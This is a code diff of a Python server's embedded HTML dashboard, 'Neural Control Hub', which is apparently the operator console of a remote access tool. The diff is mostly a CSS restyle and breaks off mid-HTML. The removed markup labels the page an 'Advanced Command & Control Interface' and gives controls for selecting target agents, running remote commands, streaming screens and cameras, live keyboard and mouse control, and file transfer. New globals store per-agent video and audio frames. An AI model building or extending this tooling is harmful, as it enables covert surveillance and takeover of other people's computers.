@@ -108,6 +108,12 @@ WEBRTC_CONFIG = {
 WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
 WEBRTC_STREAMS = {}  # agent_id -> {screen, audio, camera} streams
 WEBRTC_VIEWERS = {}  # viewer_id -> {agent_id, pc, streams}
+WEBRTC_VIEWER_CONNECTIONS = {}  # viewer_id -> RTCPeerConnection
+
+# Video/Audio Frame Storage
+VIDEO_FRAMES_H264 = defaultdict(lambda: None)
+CAMERA_FRAMES_H264 = defaultdict(lambda: None)
+AUDIO_FRAMES_OPUS = defaultdict(lambda: None)
 
 # Production Scale Configuration
 PRODUCTION_SCALE = {
@@ -1175,1921 +1181,680 @@ DASHBOARD_HTML = r'''
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Neural Control Hub - Dashboard</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
-    <style>
-        :root {
-            --primary-bg: #f8fafc;
-            --secondary-bg: #ffffff;
-            --tertiary-bg: #f1f5f9;
-            --accent-blue: #2563eb;
-            --accent-blue-dark: #1d4ed8;
-            --accent-green: #059669;
-            --accent-red: #dc2626;
-            --accent-orange: #ea580c;
-            --accent-yellow: #ca8a04;
-            --text-primary: #0f172a;
-            --text-secondary: #475569;
-            --text-muted: #64748b;
-            --border-color: #e2e8f0;
-            --border-light: #f1f5f9;
-            --shadow-sm: 0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);
-            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
-            --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background: var(--primary-bg);
-            color: var(--text-primary);
-            height: 100vh;
-            overflow: hidden;
-            line-height: 1.5;
-        }
-
-        .dashboard-container {
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .top-bar {
-            background: var(--secondary-bg);
-            border-bottom: 1px solid var(--border-color);
-            padding: 12px 24px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: var(--shadow-sm);
-            flex-shrink: 0;
-        }
-
-        .header h1 {
-            font-size: 1.5rem;
-            font-weight: 600;
-            color: var(--text-primary);
-        }
-
-        .header .subtitle {
-            font-size: 0.875rem;
-            color: var(--text-secondary);
-            margin-top: 2px;
-        }
-
-        .user-controls {
-            display: flex;
-            gap: 12px;
-            align-items: center;
-        }
-
-        .main-content {
-            flex: 1;
-            display: grid;
-            grid-template-columns: 300px 1fr 300px;
-            grid-template-rows: 1fr;
-            gap: 16px;
-            padding: 16px;
-            overflow: hidden;
-        }
-
-        .sidebar {
-            background: var(--secondary-bg);
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
-            box-shadow: var(--shadow-sm);
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .center-panel {
-            background: var(--secondary-bg);
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
-            box-shadow: var(--shadow-sm);
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .panel-header {
-            background: var(--tertiary-bg);
-            padding: 12px 16px;
-            border-bottom: 1px solid var(--border-color);
-            font-weight: 600;
-            font-size: 0.875rem;
-            color: var(--text-primary);
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .panel-content {
-            flex: 1;
-            padding: 16px;
-            overflow-y: auto;
-        }
-
-        .agent-list {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-
-        .agent-item {
-            padding: 12px;
-            background: var(--tertiary-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            font-size: 0.875rem;
-        }
-
-        .agent-item:hover {
-            background: var(--border-light);
-            border-color: var(--accent-blue);
-        }
-
-        .agent-item.selected {
-            background: var(--accent-blue);
-            color: white;
-            border-color: var(--accent-blue);
-        }
-
-        .agent-status {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 4px;
-        }
-
-        .status-indicator {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: var(--accent-green);
-        }
-
-        .status-indicator.offline {
-            background: var(--accent-red);
-        }
-
-        .control-group {
-            margin-bottom: 16px;
-        }
-
-        .control-header {
-            font-weight: 600;
-            font-size: 0.875rem;
-            color: var(--text-primary);
-            margin-bottom: 8px;
-            padding-bottom: 4px;
-            border-bottom: 1px solid var(--border-light);
-        }
-
-        .btn {
-            background: var(--accent-blue);
-            color: white;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 6px;
-            font-size: 0.875rem;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            margin-right: 8px;
-            margin-bottom: 8px;
-        }
-
-        .btn:hover {
-            background: var(--accent-blue-dark);
-            transform: translateY(-1px);
-        }
-
-        .btn-danger {
-            background: var(--accent-red);
-        }
-
-        .btn-danger:hover {
-            background: #b91c1c;
-        }
-
-        .btn-success {
-            background: var(--accent-green);
-        }
-
-        .btn-success:hover {
-            background: #047857;
-        }
-
-        .input-group {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 8px;
-        }
-
-        .neural-input {
-            flex: 1;
-            padding: 8px 12px;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            font-size: 0.875rem;
-            background: var(--secondary-bg);
-        }
-
-        .neural-input:focus {
-            outline: none;
-            border-color: var(--accent-blue);
-            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
-        }
-
-        .video-container {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 16px;
-            height: 100%;
-        }
-
-        .video-panel {
-            background: var(--tertiary-bg);
-            border-radius: 6px;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .video-panel video {
-            width: 100%;
-            height: 200px;
-            object-fit: cover;
-            background: #000;
-        }
-
-        .video-controls {
-            padding: 12px;
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-
-        .webrtc-panel {
-            background: var(--tertiary-bg);
-            border-radius: 6px;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .webrtc-video {
-            width: 100%;
-            height: 200px;
-            object-fit: cover;
-            background: #000;
-        }
-
-        .webrtc-controls {
-            padding: 12px;
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-
-        .status-display {
-            padding: 8px 12px;
-            background: var(--tertiary-bg);
-            border-radius: 6px;
-            font-size: 0.875rem;
-            color: var(--text-secondary);
-            margin-top: 8px;
-        }
-
-        .terminal {
-            background: #1e293b;
-            color: #e2e8f0;
-            padding: 12px;
-            border-radius: 6px;
-            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
-            font-size: 0.875rem;
-            height: 200px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-        }
-
-        .metrics-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-        }
-
-        .metric-card {
-            background: var(--tertiary-bg);
-            padding: 12px;
-            border-radius: 6px;
-            border: 1px solid var(--border-color);
-        }
-
-        .metric-value {
-            font-size: 1.5rem;
-            font-weight: 600;
-            color: var(--accent-blue);
-        }
-
-        .metric-label {
-            font-size: 0.75rem;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-        }
-
-        .logout-btn {
-            background: var(--accent-red);
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 6px;
-            font-size: 0.875rem;
-            font-weight: 500;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-        }
-
-        .logout-btn:hover {
-            background: #b91c1c;
-        }
-
-        .logout-btn {
-            background: var(--accent-red);
-            border: none;
-            border-radius: 6px;
-            padding: 8px 16px;
-            color: white;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            text-decoration: none;
-            font-size: 0.875rem;
-            box-shadow: var(--shadow-sm);
-        }
-
-        .logout-btn:hover {
-            background: #dc2626;
-            box-shadow: var(--shadow-md);
-        }
-
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 24px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .main-grid {
-            display: grid;
-            grid-template-columns: 1fr 2fr;
-            gap: 24px;
-            margin-bottom: 24px;
-        }
-
-        .dashboard-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
-            gap: 24px;
-            margin-top: 24px;
-        }
-
-        .panel {
-            background: var(--secondary-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 24px;
-            box-shadow: var(--shadow-sm);
-            transition: all 0.2s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .panel:hover {
-            box-shadow: var(--shadow-md);
-            border-color: var(--accent-blue);
-        }
-
-        .panel::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: var(--accent-blue);
-            opacity: 0;
-            transition: opacity 0.2s ease;
-        }
-
-        .panel:hover::before {
-            opacity: 1;
-        }
-
-        .panel-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-            padding-bottom: 16px;
-            border-bottom: 1px solid var(--border-light);
-        }
-
-        .panel-icon {
-            width: 32px;
-            height: 32px;
-            margin-right: 12px;
-            background: var(--accent-blue);
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 16px;
-        }
-
-        .panel-title {
-            font-family: 'Inter', sans-serif;
-            font-size: 1.125rem;
-            font-weight: 600;
-            color: var(--text-primary);
-        }
-
-        .agent-grid {
-            display: grid;
-            gap: 12px;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-
-        .agent-card {
-            background: var(--secondary-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 16px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            position: relative;
-            border-left: 4px solid transparent;
-        }
-
-        .agent-card:hover {
-            border-color: var(--accent-blue);
-            border-left-color: var(--accent-blue);
-            box-shadow: var(--shadow-md);
-            transform: translateY(-1px);
-        }
-
-        .agent-card.selected {
-            border-color: var(--accent-blue);
-            border-left-color: var(--accent-blue);
-            background: rgba(59, 130, 246, 0.05);
-            box-shadow: var(--shadow-md);
-        }
-
-        .agent-status {
-            position: absolute;
-            top: 12px;
-            right: 12px;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: var(--accent-green);
-            box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.2);
-        }
-
-        .agent-id {
-            font-family: 'Inter', sans-serif;
-            font-weight: 600;
-            color: var(--text-primary);
-            margin-bottom: 6px;
-            font-size: 0.875rem;
-        }
-
-        .agent-info {
-            font-size: 0.75rem;
-            color: var(--text-muted);
-        }
-
-        .control-section {
-            display: grid;
-            gap: 20px;
-        }
-
-        .control-group {
-            background: var(--secondary-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 20px;
-            transition: all 0.2s ease;
-            position: relative;
-        }
-
-        .control-group:hover {
-            border-color: var(--accent-blue);
-            box-shadow: var(--shadow-sm);
-            background: var(--tertiary-bg);
-        }
-
-        .control-group::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 20px;
-            right: 20px;
-            height: 1px;
-            background: var(--border-light);
-        }
-
-        .control-header {
-            font-family: 'Inter', sans-serif;
-            font-size: 0.875rem;
-            font-weight: 600;
-            color: var(--text-primary);
-            margin-bottom: 16px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .input-group {
-            margin-bottom: 16px;
-        }
-
-        .input-label {
-            display: block;
-            font-size: 0.875rem;
-            color: var(--text-secondary);
-            margin-bottom: 6px;
-            font-weight: 500;
-        }
-
-        .neural-input {
-            width: 100%;
-            background: var(--secondary-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            padding: 10px 12px;
-            color: var(--text-primary);
-            font-size: 0.875rem;
-            transition: all 0.2s ease;
-        }
-
-        .neural-input:focus {
-            outline: none;
-            border-color: var(--accent-blue);
-            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
-        }
-
-        .neural-input[readonly] {
-            background: var(--tertiary-bg);
-            color: var(--text-muted);
-        }
-
-        .btn {
-            background: var(--accent-blue);
-            border: none;
-            border-radius: 6px;
-            padding: 10px 16px;
-            color: white;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            margin-right: 8px;
-            margin-bottom: 8px;
-            font-size: 0.875rem;
-            box-shadow: var(--shadow-sm);
-        }
-
-        .btn:hover {
-            background: #1e3a8a;
-            box-shadow: var(--shadow-md);
-        }
-
-        .btn:active {
-            transform: translateY(0);
-        }
-
-        .btn-danger {
-            background: var(--accent-red);
-        }
-
-        .btn-danger:hover {
-            background: #b91c1c;
-        }
-
-        .btn-success {
-            background: var(--accent-green);
-        }
-
-        .btn-success:hover {
-            background: #047857;
-        }
-
-        .output-terminal {
-            background: #1e293b;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 20px;
-            font-family: 'Courier New', monospace;
-            color: #10b981;
-            min-height: 200px;
-            max-height: 400px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            position: relative;
-        }
-
-        .output-terminal::before {
-            content: "NEURAL_TERMINAL_v2.1 > ";
-            color: var(--accent-blue);
-            font-weight: bold;
-        }
-
-        .status-indicator {
-            padding: 8px 12px;
-            border-radius: 6px;
-            font-size: 0.875rem;
-            font-weight: 500;
-            margin-top: 12px;
-            display: none;
-        }
-
-        .status-success {
-            background: rgba(16, 185, 129, 0.1);
-            color: var(--accent-green);
-            border: 1px solid rgba(16, 185, 129, 0.2);
-        }
-
-        .status-error {
-            background: rgba(239, 68, 68, 0.1);
-            color: var(--accent-red);
-            border: 1px solid rgba(239, 68, 68, 0.2);
-        }
-
-        .config-status {
-            display: grid;
-            gap: 12px;
-        }
-
-        .config-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 12px 0;
-            border-bottom: 1px solid var(--border-light);
-        }
-
-        .config-item:last-child {
-            border-bottom: none;
-        }
-
-        .config-label {
-            font-weight: 500;
-            color: var(--text-secondary);
-        }
-
-        .config-value {
-            font-family: 'Inter', sans-serif;
-            color: var(--accent-blue);
-            font-size: 0.875rem;
-        }
-
-        .password-management {
-            display: grid;
-            gap: 16px;
-        }
-
-        .password-strength {
-            margin-top: 8px;
-            padding: 8px;
-            border-radius: 4px;
-            font-size: 0.85rem;
-            font-weight: 500;
-        }
-
-        .password-weak {
-            background: rgba(255, 71, 87, 0.2);
-            color: var(--accent-red);
-            border: 1px solid var(--accent-red);
-        }
-
-        .password-medium {
-            background: rgba(255, 193, 7, 0.2);
-            color: #ffc107;
-            border: 1px solid #ffc107;
-        }
-
-        .password-strong {
-            background: rgba(0, 255, 136, 0.2);
-            color: var(--accent-green);
-            border: 1px solid var(--accent-green);
-        }
-
-        .no-agents {
-            text-align: center;
-            padding: 40px 20px;
-            color: var(--text-secondary);
-        }
-
-        .no-agents-icon {
-            font-size: 3rem;
-            margin-bottom: 15px;
-            opacity: 0.5;
-        }
-
-        /* Scrollbar Styling */
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: var(--primary-bg);
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: var(--accent-blue);
-            border-radius: 4px;
-        }
-
-        ::-webkit-scrollbar-thumb:hover {
-            background: var(--accent-purple);
-        }
-
-        /* Video Panel Enhancements */
-        .video-panel {
-            background: var(--secondary-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 24px;
-            box-shadow: var(--shadow-sm);
-            transition: all 0.2s ease;
-        }
-
-        .video-panel video {
-            border-radius: 8px;
-            box-shadow: var(--shadow-sm);
-        }
-
-        .webrtc-controls {
-            margin-bottom: 16px;
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-
-        /* Status Enhancements */
-        .status-display {
-            background: var(--tertiary-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            padding: 12px;
-            margin-top: 12px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.875rem;
-        }
-
-        /* Enhanced Panel Styling */
-        .panel-header {
-            position: relative;
-        }
-
-        .panel-header::after {
-            content: '';
-            position: absolute;
-            bottom: -16px;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: var(--border-color);
-            opacity: 0.5;
-        }
-
-        /* Enhanced Button Styling */
-        .btn {
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: left 0.5s ease;
-        }
-
-        .btn:hover::before {
-            left: 100%;
-        }
-
-        /* Enhanced Input Styling */
-        .neural-input:focus {
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15);
-        }
-
-        /* Dashboard Grid Enhancements */
-        .dashboard-grid {
-            animation: fadeInUp 0.6s ease-out;
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* Enhanced Visual Elements */
-        .panel-icon {
-            position: relative;
-        }
-
-        .panel-icon::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 100%;
-            height: 100%;
-            background: var(--accent-blue);
-            border-radius: 8px;
-            opacity: 0.1;
-            transform: translate(-50%, -50%) scale(1.5);
-            z-index: -1;
-        }
-
-        /* Enhanced Control Groups */
-        .control-group {
-            position: relative;
-        }
-
-        .control-group::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 3px;
-            height: 100%;
-            background: var(--accent-blue);
-            border-radius: 0 2px 2px 0;
-            opacity: 0;
-            transition: opacity 0.2s ease;
-        }
-
-        .control-group:hover::before {
-            opacity: 1;
-        }
-
-        /* Enhanced Status Indicators */
-        .status-indicator {
-            position: relative;
-            overflow: hidden;
-        }
-
-        .status-indicator::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
-            animation: shimmer 2s infinite;
-        }
-
-        @keyframes shimmer {
-            0% { left: -100%; }
-            100% { left: 100%; }
-        }
-
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .main-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .header h1 {
-                font-size: 2rem;
-            }
-            
-            .top-bar-content {
-                flex-direction: column;
-                gap: 15px;
-            }
-            
-            .container {
-                padding: 15px;
-            }
-        }
-    </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Neural Control Hub — Best Practices Dashboard</title>
+
+<!-- Fonts & libs -->
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Orbitron:wght@600;900&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+
+<style>
+  :root{
+    --bg-1:#070709;         /* deep black */
+    --bg-2:#0f1724;         /* dark blue/charcoal */
+    --glass: rgba(255,255,255,0.03);
+    --glass-2: rgba(255,255,255,0.04);
+    --accent-a:#00d4ff;
+    --accent-b:#7c5cff;
+    --muted:#98a0b3;
+    --card-border: rgba(255,255,255,0.04);
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%;margin:0;font-family:"Inter",system-ui,-apple-system,Segoe UI,roboto,"Helvetica Neue",Arial;}
+  body{
+    background: radial-gradient(1200px 600px at 10% 10%, rgba(30,40,60,0.3), transparent),
+                radial-gradient(1000px 600px at 90% 90%, rgba(90,40,120,0.12), transparent),
+                linear-gradient(180deg,var(--bg-1),var(--bg-2));
+    color:#dbe7ff;
+    -webkit-font-smoothing:antialiased;
+    overflow:hidden;
+  }
+
+  /* Top navbar */
+  .top-nav{
+    height:68px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    padding:0 22px;
+    gap:16px;
+    border-bottom:1px solid rgba(255,255,255,0.03);
+    backdrop-filter:blur(6px);
+    background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.00));
+    position:relative;
+  }
+  .brand{
+    display:flex;
+    align-items:center;
+    gap:14px;
+  }
+  .brand .logo{
+    height:44px;width:44px;border-radius:10px;
+    background:linear-gradient(135deg,var(--accent-a),var(--accent-b));
+    display:flex;align-items:center;justify-content:center;font-weight:800;font-family:Orbitron;
+    color:#02111a; box-shadow:0 6px 20px rgba(0,0,0,0.6);
+  }
+  .brand h1{font-size:1.05rem;margin:0;color:#e8f5ff;font-weight:700}
+  .nav-tabs{display:flex;gap:12px;margin-left:20px}
+  .nav-tab{
+    color:var(--muted); padding:10px 12px; border-radius:8px; font-weight:600; font-size:0.9rem;
+    cursor:pointer; transition:all .15s ease;
+  }
+  .nav-tab.active{
+    color:white; background:linear-gradient(90deg, rgba(0,212,255,0.06), rgba(124,92,255,0.05));
+    border:1px solid rgba(255,255,255,0.03);
+    box-shadow:0 6px 20px rgba(7,22,50,0.5);
+  }
+
+  .top-actions{display:flex;align-items:center;gap:12px}
+  .top-actions .btn{
+    background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.03);padding:8px 12px;border-radius:8px;font-weight:600;
+  }
+  .top-actions .logout{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));padding:9px 14px;color:#06131a;border:none}
+
+  /* Page layout */
+  .page{
+    display:grid;
+    grid-template-columns: 320px 1fr 360px;
+    grid-template-rows: auto 1fr;
+    gap:16px;
+    height: calc(100vh - 68px);
+    padding:18px;
+  }
+
+  /* Filters row spanning center+right */
+  .filters{
+    grid-column: 1 / span 3;
+    display:flex;gap:12px;align-items:center;padding:12px;border-radius:12px;background:var(--glass-2);
+    border:1px solid var(--card-border); margin-bottom:0;
+  }
+  .filters .filter{padding:10px 12px;border-radius:8px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.02);color:var(--muted);font-weight:600}
+  .filters .filter.select{min-width:180px}
+  .filters .spacer{flex:1}
+
+  /* Left sidebar */
+  .sidebar{
+    background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+    border-radius:12px;padding:16px;border:1px solid var(--card-border);overflow:auto;
+  }
+  .sidebar h3{margin:0 0 12px 0;font-size:0.95rem;color:#fff}
+  .agent-list{display:flex;flex-direction:column;gap:10px}
+  .agent-item{
+    display:flex;align-items:center;justify-content:space-between;padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);
+    border:1px solid rgba(255,255,255,0.02); cursor:pointer; transition:all 0.2s ease;
+  }
+  .agent-item:hover{
+    background:rgba(255,255,255,0.03); border-color:rgba(255,255,255,0.05);
+  }
+  .agent-item.selected{
+    background:rgba(0,212,255,0.08); border-color:rgba(0,212,255,0.3); box-shadow:0 0 12px rgba(0,212,255,0.15);
+  }
+  .agent-item .meta{display:flex;gap:10px;align-items:center}
+  .agent-bullet{width:12px;height:12px;border-radius:50%}
+  .bullet-online{background:#0ee6a6;box-shadow:0 0 8px rgba(14,230,166,0.12)}
+  .bullet-off{background:#ff5c7c}
+  .agent-name{font-weight:700;color:#eaf7ff}
+  .agent-sub{font-size:0.8rem;color:var(--muted)}
+
+  .controls{margin-top:14px;display:flex;flex-direction:column;gap:10px}
+  .control-btn{padding:10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.03);color:var(--muted);font-weight:700;cursor:pointer}
+  .control-btn.primary{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));color:#02111a;border:none}
+
+  /* Center area */
+  .center{
+    display:flex;flex-direction:column;gap:14px;padding:6px;overflow:hidden;
+  }
+  .card{
+    border-radius:12px;padding:18px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+    border:1px solid var(--card-border);
+  }
+
+  .summary-row{display:grid;grid-template-columns: repeat(3,1fr);gap:14px}
+  .summary-card{display:flex;gap:14px;align-items:center}
+  .summary-card .chart-wrap{width:100px;height:100px;display:flex;align-items:center;justify-content:center}
+  .summary-card .info{flex:1}
+  .metric-big{font-size:1.45rem;font-weight:800;color:#fff}
+  .metric-sub{color:var(--muted);font-size:0.85rem;margin-top:6px}
+
+  .trend{
+    margin-top:6px;height:320px;
+  }
+
+  /* Right column */
+  .rightcol{display:flex;flex-direction:column;gap:14px;padding:0 6px;overflow:auto}
+  .metric-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  .metric-pill{padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);border:1px solid var(--card-border);text-align:center}
+  .metric-pill .v{font-weight:800;font-size:1.3rem;color:#fff}
+  .terminal{height:260px;padding:12px;border-radius:10px;background:#071226;border:1px solid rgba(255,255,255,0.02);overflow:auto;font-family:monospace;color:#8ef0c5}
+
+  /* Videos row inside center */
+  .videos{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
+  .video-card{height:180px;border-radius:10px;background:#000;display:flex;flex-direction:column;overflow:hidden;position:relative}
+  .video-card video{width:100%;height:100%;object-fit:cover}
+  .video-overlay{position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(180deg,rgba(0,0,0,0.7) 0%,transparent 30%,transparent 70%,rgba(0,0,0,0.7) 100%);pointer-events:none}
+  .video-status{position:absolute;top:8px;left:8px;background:rgba(0,0,0,0.8);color:#fff;padding:4px 8px;border-radius:6px;font-size:0.75rem;font-weight:600}
+  
+  /* WebRTC Controls */
+  .quality-select{padding:6px 8px;border-radius:6px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);color:#fff;font-size:0.85rem}
+  .webrtc-status{display:flex;flex-direction:column;gap:6px;padding:8px;background:rgba(255,255,255,0.02);border-radius:8px;border:1px solid rgba(255,255,255,0.03)}
+  .status-item{display:flex;justify-content:space-between;align-items:center;font-size:0.85rem}
+  .status-label{color:var(--muted)}
+  .status-value{color:#fff;font-weight:600}
+  .status-value.connected{color:#0ee6a6}
+  .status-value.disconnected{color:#ff5c7c}
+  .status-value.warning{color:#ffb84d}
+
+  /* Small helpers */
+  .muted{color:var(--muted)}
+  .small{font-size:0.85rem}
+  .kpi{display:flex;gap:8px;align-items:center}
+  .kpi .dot{width:10px;height:10px;border-radius:50%}
+  .dot-blue{background:var(--accent-a)}
+  .dot-purple{background:var(--accent-b)}
+
+  /* responsive */
+  @media (max-width:1100px){
+    .page{grid-template-columns: 1fr; grid-auto-rows: auto; height:calc(100vh - 68px); overflow:auto}
+    .filters{grid-column:1}
+  }
+</style>
 </head>
 <body>
-    <div class="dashboard-container">
-        <div class="top-bar">
-            <div class="header">
-                <h1>Neural Control Hub</h1>
-                <div class="subtitle">Advanced Command & Control Interface</div>
-            </div>
-            <div class="user-controls">
-                <a href="/logout" class="logout-btn">Logout</a>
-            </div>
-        </div>
-        
-        <div class="main-content">
-            <!-- Left Sidebar - Agents & Controls -->
-            <div class="sidebar">
-                <div class="panel-header">
-                    <span>🔗</span>
-                    Active Agents
-                </div>
-                <div class="panel-content">
-                    <div class="agent-list" id="agent-list">
-                        <div class="agent-item">
-                            <div class="agent-status">
-                                <div class="status-indicator offline"></div>
-                                <span>No agents connected</span>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="control-group">
-                        <div class="control-header">Target Selection</div>
-                        <input type="text" class="neural-input" id="agent-id" readonly placeholder="Select an agent">
-                    </div>
-                    
-                    <div class="control-group">
-                        <div class="control-header">Command Execution</div>
-                        <input type="text" class="neural-input" id="command" placeholder="Enter command...">
-                        <button class="btn" onclick="issueCommand()">Execute</button>
-                    </div>
-                    
-                    <div class="control-group">
-                        <div class="control-header">Quick Actions</div>
-                        <button class="btn" onclick="listProcesses()">Processes</button>
-                        <button class="btn" onclick="startScreenStream()">Screen</button>
-                        <button class="btn" onclick="startCameraStream()">Camera</button>
-                        <button class="btn btn-danger" onclick="stopAllStreams()">Stop All</button>
-                    </div>
-                    
-                    <div class="control-group">
-                        <div class="control-header">Live Control</div>
-                        <div id="live-keyboard-input" tabindex="0" class="neural-input" style="height: 60px; resize: none;" placeholder="Live keyboard..."></div>
-                        <div id="live-mouse-area" style="width: 100%; height: 80px; border: 1px solid var(--border-color); background: var(--tertiary-bg); margin-top: 8px; border-radius: 6px;"></div>
-                    </div>
-                    
-                    <div class="control-group">
-                        <div class="control-header">File Transfer</div>
-                        <input type="file" id="file-upload" style="display: none;">
-                        <button class="btn" onclick="document.getElementById('file-upload').click()">Upload File</button>
-                        <input type="text" class="neural-input" id="download-path" placeholder="File path to download">
-                        <button class="btn" onclick="downloadFile()">Download</button>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Center Panel - Video Streams & WebRTC -->
-            <div class="center-panel">
-                <div class="panel-header">
-                    <span>📹</span>
-                    Live Streams
-                </div>
-                <div class="panel-content">
-                    <div class="video-container">
-                        <div class="video-panel">
-                            <video id="screen-video" autoplay muted></video>
-                            <div class="video-controls">
